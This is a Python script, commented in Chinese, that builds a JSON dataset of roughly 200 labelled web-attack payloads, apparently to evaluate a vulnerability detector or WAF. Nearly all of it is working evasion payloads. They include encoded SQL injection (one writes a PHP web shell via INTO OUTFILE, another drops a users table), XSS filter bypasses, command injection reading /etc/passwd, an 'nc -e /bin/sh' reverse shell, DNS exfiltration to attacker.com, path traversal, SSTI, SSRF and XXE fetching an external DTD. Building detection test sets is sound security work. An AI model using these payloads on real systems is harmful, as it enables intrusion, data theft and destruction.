#!/usr/bin/env python
"""
============================================================================
  对抗样本数据集生成器
  生成 200+ 绕过攻击 payload（编码绕过、WAF 规避、混淆变体）
============================================================================
"""
import json
from pathlib import Path

OUTPUT = Path(__file__).parent / "dataset" / "adversarial_samples.json"


def generate() -> list[dict]:
    """生成所有对抗样本。返回 list[dict]。"""
    samples = []
    sid = 0

    # ================================================================
    #  SQL 注入 — URL/Unicode 编码绕过 (~50 条)
    # ================================================================
    sqli_templates = [
        ("URL编码 单引号", "1%27%20OR%20%271%27%3D%271"),
        ("URL编码 空格", "1%27%20OR%201%3D1--"),
        ("URL编码 注释", "1%27%20OR%201%3D1%23"),
        ("双重URL编码 单引号", "1%2527%2520OR%2520%25271%2527%253D%25271"),
        ("双重URL编码 UNION", "1%2527%2520UNION%2520SELECT%2520NULL--"),
        ("Unicode编码 单引号", "1\\u0027 OR \\u00271\\u0027=\\u00271"),
        ("十六进制编码 SELECT", "1' UNION SELECT 0x61646d696e--"),
        ("十六进制编码 字符串", "1' OR '1'=0x31--"),
        ("双重十六进制", "1' UNION SELECT 0x6164--"),
        ("MySQL内联注释", "1'/**/OR/**/1=1--"),
        ("MySQL版本注释", "1'/*!50000OR*/ 1=1--"),
        ("MySQL条件注释", "1'/*!OR 1=1*/--"),
        ("多行注释绕过", "1'/**/OR/**/1/**/=/**/1--"),
        ("哈希注释", "1' OR 1=1#"),
        ("双减号注释", "1' OR 1=1-- -"),
        ("分号分隔", "1'; OR 1=1--"),
        ("大小写混淆 SELECT", "1' UnIoN SeLeCt NULL--"),
        ("大小写混淆 OR", "1' oR 1=1--"),
        ("大小写混淆 AND", "1' aNd '1'='1"),
        ("混合大小写", "1' UnIoN/**/sElEcT/**/null--"),
        ("%00截断", "1' OR 1=1%00"),
        ("空白符变体 TAB", "1'\tOR\t1=1--"),
        ("空白符变体 换行", "1'\nOR\n1=1--"),
        ("空白符变体 CRLF", "1'\r\nOR\r\n1=1--"),
        ("空白符变体 垂直tab", "1'\x0bOR\x0b1=1--"),
        ("NULL字节注入", "1' OR 1=1\x00--"),
        ("管道符替代", "1' || 1=1--"),
        ("等式恒真", "1' OR 'x'='x"),
        ("减法恒真", "1' OR 1=2-1--"),
        ("除法恒真", "1' OR 1=5/5--"),
        ("LIKE比较", "1' OR 'a' LIKE 'a'--"),
        ("BETWEEN", "1' OR 1 BETWEEN 1 AND 1--"),
        ("IN子句", "1' OR 1 IN (1)--"),
        ("函数调用恒真", "1' OR LENGTH('x')=1--"),
        ("ASCII函数", "1' OR ASCII('a')=97--"),
        ("CHAR函数", "1' UNION SELECT CHAR(97,100,109,105,110)--"),
        ("CONCAT绕过", "1' UNION SELECT CONCAT(CHAR(97),CHAR(100))--"),
        ("ORDER BY探测", "1' ORDER BY 1--"),
        ("UNION SELECT NULL多列", "1' UNION SELECT NULL,NULL,NULL--"),
        ("注释中的空格", "1'/**/UNION/**/SELECT/**/NULL--"),
        ("SELECT子查询", "1' AND (SELECT 1)=1--"),
        ("EXISTS子查询", "1' AND EXISTS(SELECT 1)--"),
        ("延时注入 BENCHMARK", "1' AND BENCHMARK(5000000,MD5('x'))--"),
        ("延时注入 IF", "1' AND IF(1=1,SLEEP(5),0)--"),
        ("堆叠查询", "1'; DROP TABLE users--"),
        ("数字型注入", "1 OR 1=1"),
        ("布尔盲注 字符比较", "1' AND SUBSTRING('admin',1,1)='a"),
        ("宽字节绕过 GBK", "1%df%27 OR 1=1--"),
        ("负号探测", "-1' OR 1=1--"),
        ("UNION ALL变体", "1' UNION ALL SELECT NULL--"),
        ("数据库枚举", "1' UNION SELECT table_name FROM information_schema.tables--"),
        ("列名枚举", "1' UNION SELECT column_name FROM information_schema.columns--"),
        ("子查询绕过", "1' AND (SELECT COUNT(*) FROM users)>0--"),
        ("HAVING绕过", "1' HAVING 1=1--"),
        ("GROUP BY绕过", "1' GROUP BY 1 HAVING 1=1--"),
        ("UNION SELECT 子查询", "1' UNION SELECT (SELECT table_name FROM information_schema.tables LIMIT 1)--"),
        ("十六进制UNION", "0x312720554e494f4e2053454c454354204e554c4c--"),
        ("字符串转义绕过", "1' OR '1\\'='1"),
        ("INTO OUTFILE", "1' UNION SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/shell.php'--"),
    ]

    for desc, payload in sqli_templates:
        sid += 1
        samples.append({
            "id": f"adv_sqli_{sid:03d}",
            "category": "SQL注入",
            "subcategory": "编码/混淆绕过",
            "payload": payload,
            "description": desc,
            "expected_type": "SQL注入",
            "expected_vulnerable": True,
            "difficulty": "medium",
        })

    # ================================================================
    #  XSS — 标签变体 / 事件处理器 / 编码绕过 (~60 条)
    # ================================================================
    sid = 0
    xss_templates = [
        # 基础标签变体
        ("标准script", '<script>alert(1)</script>'),
        ("大写SCRIPT", '<SCRIPT>alert(1)</SCRIPT>'),
        ("混合大小写", '<ScRiPt>alert(1)</ScRiPt>'),
        ("script内嵌空格", '<script >alert(1)</script>'),
        ("script多余属性", '<script x>alert(1)</script>'),
        ("img onerror", '<img src=x onerror=alert(1)>'),
        ("img onerror引号", '<img src="x" onerror="alert(1)">'),
        ("img 无src", '<img onerror=alert(1)>'),
        ("img onload", '<img onload=alert(1)>'),
        ("body onload", '<body onload=alert(1)>'),
        ("svg onload", '<svg onload=alert(1)>'),
        ("svg 内嵌script", '<svg><script>alert(1)</script></svg>'),
        ("input onfocus", '<input onfocus=alert(1) autofocus>'),
        ("details ontoggle", '<details open ontoggle=alert(1)>'),
        ("marquee onstart", '<marquee onstart=alert(1)>'),
        ("select onfocus", '<select onfocus=alert(1) autofocus>'),
        ("video onerror", '<video><source onerror=alert(1)>'),
        ("audio onerror", '<audio src=x onerror=alert(1)>'),
        ("object data", '<object data="javascript:alert(1)">'),
        ("iframe src", '<iframe src="javascript:alert(1)">'),
        ("a href", '<a href="javascript:alert(1)">click</a>'),
        ("form action", '<form action="javascript:alert(1)"><button>submit</button></form>'),
        ("button onclick", '<button onclick="alert(1)">click</button>'),
        ("div onmouseover", '<div onmouseover="alert(1)">hover</div>'),
        ("style expression", '<div style="x:expression(alert(1))">'),
        ("math标签", '<math><mi><a xlink:href="javascript:alert(1)">x</a></mi></math>'),
        ("embed src", '<embed src="javascript:alert(1)">'),
        ("keygen onfocus", '<keygen onfocus=alert(1) autofocus>'),

        # HTML实体编码
        ("HTML实体 分号", '&#60;script&#62;alert(1)&#60;/script&#62;'),
        ("HTML实体 十进制", '&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;'),
        ("HTML实体 十六进制", '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;'),
        ("HTML实体 img", '&#60;img&#32;src&#61;x&#32;onerror&#61;alert(1)&#62;'),
        ("HTML实体 混合", '&#x3c;&#115;&#x63;&#114;&#105;&#x70;&#116;&#x3e;alert(1)&#x3c;/script&#x3e;'),

        # JS编码
        ("JS escape", '\\x3cscript\\x3ealert(1)\\x3c\\x2fscript\\x3e'),
        ("JS unicode", '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e'),
        ("JS fromCharCode", '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>'),
        ("JS 逗号拼接", '<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">'),

        # 双写/嵌套/注释绕过
        ('双写script', '<scr<script>ipt>alert(1)</scr</script>ipt>'),
        ('嵌套标签', '<scr<object>ipt>alert(1)</scr</object>ipt>'),
        ('注释绕过', '<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>'),
        ('JS注释', '<img src=x onerror="al/**/ert(1)">'),
        ('JS换行', '<img src=x onerror="al\ner\\\nt(1)">'),
        ('URL编码 标签', '%3Cscript%3Ealert(1)%3C/script%3E'),
        ('部分URL编码', '%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'),
        ('双重URL编码', '%253Cscript%253Ealert(1)%253C%252Fscript%253E'),

        # DOM XSS
        ('location.hash', '<img src=x onerror="eval(location.hash.slice(1))">#alert(1)'),
        ('document.cookie', '<img src=x onerror="eval(document.cookie)">'),
        ('document.write', '<script>document.write(\'<img src=x onerror=alert(1)>\')</script>'),
        ('innerHTML', '<div id=x></div><script>document.getElementById("x").innerHTML="<img src=x onerror=alert(1)>"</script>'),
        ('setTimeout', '<img src=x onerror="setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),0)">'),

        # 空字节/非打印字符绕过
        ('空字节', '<scr\x00ipt>alert(1)</scr\x00ipt>'),
        ('%00截断', '<sc%00ript>alert(1)</sc%00ript>'),
        ('空格变体', '<img\x0asrc=x\x0aonerror=alert(1)>'),
        ('反引号', '<img src=x onerror=alert`1`>'),

        # 属性拆分
        ('属性拆分src', '<img/src=x/onerror=alert(1)>'),
        ('属性拆分双引号', '<img """><script>alert(1)</script>">'),
        ('多余双引号', '"><script>alert(1)</script>'),
        ('闭合属性', '\' onerror=\'alert(1)'),
        ('闭合标签', '</textarea><script>alert(1)</script>'),
        ('input type=image', '<input type="image" src=x onerror=alert(1)>'),
        ('isindex action', '<isindex type=image src=1 onerror=alert(1)>'),
        ('table background', '<table background="javascript:alert(1)">'),
        ('meta refresh', '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'),
        ('link stylesheet', '<link rel="stylesheet" href="javascript:alert(1)">'),
        ('html5 video poster', '<video poster="javascript:alert(1)">'),
        ('事件 onfocusin', '<div onfocusin=alert(1) tabindex=1>'),
        ('非打印字符', '<img src=x\x0Eonerror=alert(1)>'),
    ]

    for desc, payload in xss_templates:
        sid += 1
        samples.append({
            "id": f"adv_xss_{sid:03d}",
            "category": "XSS",
            "subcategory": "标签/编码/混淆绕过",
            "payload": payload,
            "description": desc,
            "expected_type": "XSS",
            "expected_vulnerable": True,
            "difficulty": "medium",
        })

    # ================================================================
    #  命令注入 — 分隔符/编码/替换 (~30 条)
    # ================================================================
    sid = 0
    cmdi_templates = [
        # 分隔符变体
        ("分号", "127.0.0.1; cat /etc/passwd"),
        ("管道符", "127.0.0.1 | cat /etc/passwd"),
        ("逻辑AND", "127.0.0.1 && cat /etc/passwd"),
        ("逻辑OR", "127.0.0.1 || cat /etc/passwd"),
        ("反引号嵌套", "127.0.0.1`cat /etc/passwd`"),
        ("美元括号", "127.0.0.1$(cat /etc/passwd)"),
        ("换行符", "127.0.0.1%0acat /etc/passwd"),
        ("URL编码 分号", "127.0.0.1%3Bcat%20/etc/passwd"),
        ("URL编码 管道", "127.0.0.1%7Ccat%20/etc/passwd"),
        ("URL编码 AND", "127.0.0.1%26%26cat%20/etc/passwd"),
        ("URL编码 反引号", "127.0.0.1%60cat%20/etc/passwd%60"),

        # 命令混淆
        ("空格绕过 ${IFS}", "127.0.0.1;cat${IFS}/etc/passwd"),
        ("空格绕过 TAB", "127.0.0.1;cat\t/etc/passwd"),
        ("命令拼接 cat", "127.0.0.1;c'a't /etc/passwd"),
        ("命令拼接 echo", "127.0.0.1;$(echo cat) /etc/passwd"),
        ("base64编码执行", "127.0.0.1;echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh"),
        ("十六进制执行", "127.0.0.1;echo 0x636174202f6574632f706173737764 | xxd -r -p | sh"),
        ("通配符 cat", "127.0.0.1;/???/??t /???/????wd"),
        ("通配符 passwd", "127.0.0.1;cat /etc/pass*"),

        # 其他命令替换
        ("head替代cat", "127.0.0.1;head -1 /etc/passwd"),
        ("tail替代cat", "127.0.0.1;tail -1 /etc/passwd"),
        ("more替代cat", "127.0.0.1;more /etc/passwd"),
        ("less替代cat", "127.0.0.1;less /etc/passwd"),
        ("awk替代cat", "127.0.0.1;awk 1 /etc/passwd"),
        ("curl替代cat", "127.0.0.1;curl file:///etc/passwd"),
        ("wget替代cat", "127.0.0.1;wget -O- file:///etc/passwd"),
        ("nc反向shell", "127.0.0.1;nc -e /bin/sh 192.168.1.1 4444"),
        ("DNS数据外泄", "127.0.0.1;nslookup `whoami`.attacker.com"),
        ("睡眠探测", "127.0.0.1;sleep 5"),
    ]

    for desc, payload in cmdi_templates:
        sid += 1
        samples.append({
            "id": f"adv_cmdi_{sid:03d}",
            "category": "命令注入",
            "subcategory": "分隔符/编码/命令替换绕过",
            "payload": payload,
            "description": desc,
            "expected_type": "命令注入",
            "expected_vulnerable": True,
            "difficulty": "medium",
        })

    # ================================================================
    #  路径穿越 — 编码/变体 (~20 条)
    # ================================================================
    sid = 0
    lfi_templates = [
        ("标准", "../../../../etc/passwd"),
        ("绝对路径", "/etc/passwd"),
        ("URL编码 点", "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"),
        ("URL编码 斜杠", "..%2f..%2f..%2f..%2fetc%2fpasswd"),
        ("双重URL编码", "..%252f..%252f..%252f..%252fetc%252fpasswd"),
        ("Unicode编码 点", "\\u002e\\u002e/\\u002e\\u002e/\\u002e\\u002e/\\u002e\\u002e/etc/passwd"),
        ("Unicode编码 斜杠", "..\\u2215..\\u2215..\\u2215..\\u2215etc\\u2215passwd"),
        ("NULL字节截断", "../../../../etc/passwd%00"),
        ("NULL字节截断 html", "../../../../etc/passwd%00.html"),
        ("Windows反斜杠", "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"),
        ("混合斜杠", "..\\../..\\../etc/passwd"),
        ("PHP wrapper php://", "php://filter/convert.base64-encode/resource=index.php"),
        ("PHP wrapper data://", "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="),
        ("PHP wrapper expect://", "expect://id"),
        ("PHP wrapper input://", "php://input"),
        ("filter双写绕过", "....//....//....//....//etc/passwd"),
        ("filter三写绕过", "..././..././..././..././etc/passwd"),
        ("UNC路径 Windows", "\\\\attacker\\share\\file"),
        ("编码与截断组合", "..%252f..%252f..%252f..%252fetc%252fpasswd%00"),
    ]

    for desc, payload in lfi_templates:
        sid += 1
        samples.append({
            "id": f"adv_lfi_{sid:03d}",
            "category": "文件包含",
            "subcategory": "路径编码/变体绕过",
            "payload": payload,
            "description": desc,
            "expected_type": "文件包含",
            "expected_vulnerable": True,
            "difficulty": "medium",
        })

    # ================================================================
    #  WAF 专项绕过（组合型）(~20 条)
    # ================================================================
    sid = 0
    waf_templates = [
        # 分块传输 / 参数污染
        ("分块传输 SQLi", "1'/**/UNION/**/SEL/**/ECT/**/NULL--"),
        ("分块传输 XSS", "<scr/**/ipt>al/**/ert(1)</scr/**/ipt>"),
        ("分块传输 CMDi", "127.0.0.1;c/**/at /etc/passwd"),
        ("HTTP参数污染", "id=1&id=1' OR 1=1--"),
        # 编码层叠
        ("七层编码 SQLi", "%25252525252527252525252520OR%252525252525201%2525252525253D1"),
        ("五层编码 XSS", "%2525253Cscript%2525253Ealert(1)%2525253C%2525252Fscript%2525253E"),
        # Host头注入
        ("Host头 SQLi", "GET /?id=1' OR 1=1-- HTTP/1.1\nHost: attacker.com\nX-Forwarded-For: 1.1.1.1"),
        # 内容类型绕过
        ("Content-Type text/plain", "POST / HTTP/1.1\nContent-Type: text/plain\n\na' OR 1=1--"),
        ("Content-Type multipart", "POST / HTTP/1.1\nContent-Type: multipart/form-data; boundary=x\n\n--x\n\na' OR 1=1--\n--x--"),
        # 请求方法绕过
        ("PUT方法 SQLi", "PUT /?id=1' OR 1=1-- HTTP/1.1"),
        ("OPTIONS方法 探测", "OPTIONS / HTTP/1.1"),
        # 片段绕过
        ("fragment绕过 SQLi", "1'/**/ORDER/**/BY/**/1--"),
        # 协议走私
        ("Transfer-Encoding chunked", "GET / HTTP/1.1\nTransfer-Encoding: chunked\n\n1\n1\n0\n\n"),
        # 组合攻击
        ("SQLi + XSS", "1' OR 1=1 UNION SELECT '<script>alert(1)</script>'--"),
        ("CMDi + SQLi", "127.0.0.1; SELECT * FROM users; cat /etc/passwd"),
        # NoSQL 注入
        ("MongoDB $gt", '{"username": {"$gt": ""}, "password": {"$gt": ""}}'),
        ("MongoDB $regex", '{"username": {"$regex": "admin.*"}, "password": {"$ne": ""}}'),
        ("MongoDB $where", '{"$where": "sleep(5000)"}'),
        # SSTI
        ("SSTI Jinja2", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
        ("SSTI Twig", "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"),
        # SSRF
        ("SSRF localhost", "http://127.0.0.1:8080/admin"),
        ("SSRF 十进制IP", "http://2130706433:8080/admin"),
        ("SSRF IPv6", "http://[::1]:8080/admin"),
        ("SSRF DNS重绑定", "http://1.1.1.1@127.0.0.1:8080/admin"),
        # XXE
        ("XXE 基础", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'),
        ("XXE 参数实体", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>'),
        ("XXE CDATA", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % start "<![CDATA["><!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % end "]]>"><!ENTITY % dtd SYSTEM "http://attacker.com/combine.dtd">%dtd;]>'),
        ("UserAgent SQLi", "1' OR 1=1-- (在 User-Agent 头中)"),
        ("Referer SQLi", "1' OR SLEEP(5)-- (在 Referer 头中)"),
        ("Cookie 注入", "1' UNION SELECT NULL-- (在 Cookie 头中)"),
        ("X-Forwarded-For SQLi", "1' AND 1=1-- (在 X-Forwarded-For 头中)"),
        ("混合SQLi+Header", "1' OR '1'='1' UNION SELECT NULL--\nUser-Agent: <script>alert(1)</script>"),
    ]

    for desc, payload in waf_templates:
        sid += 1
        samples.append({
            "id": f"adv_waf_{sid:03d}",
            "category": "WAF绕过/综合",
            "subcategory": "WAF专项/组合攻击绕过",
            "payload": payload,
            "description": desc,
            "expected_type": "变体",
            "expected_vulnerable": True,
            "difficulty": "hard",
        })

    return samples


def main():
    samples = generate()
    OUTPUT.parent.mkdir(exist_ok=True)
    with open(OUTPUT, "w", encoding="utf-8") as f:
        json.dump(samples, f, ensure_ascii=False, indent=2)

    # 统计
    cats = {}
    for s in samples:
        cats[s["category"]] = cats.get(s["category"], 0) + 1
    print(f"对抗样本已生成: {OUTPUT}")
    print(f"总计: {len(samples)} 条")
    for c, n in sorted(cats.items(), key=lambda x: -x[1]):
        print(f"  {c}: {n} 条")


if __name__ == "__main__":
    main()
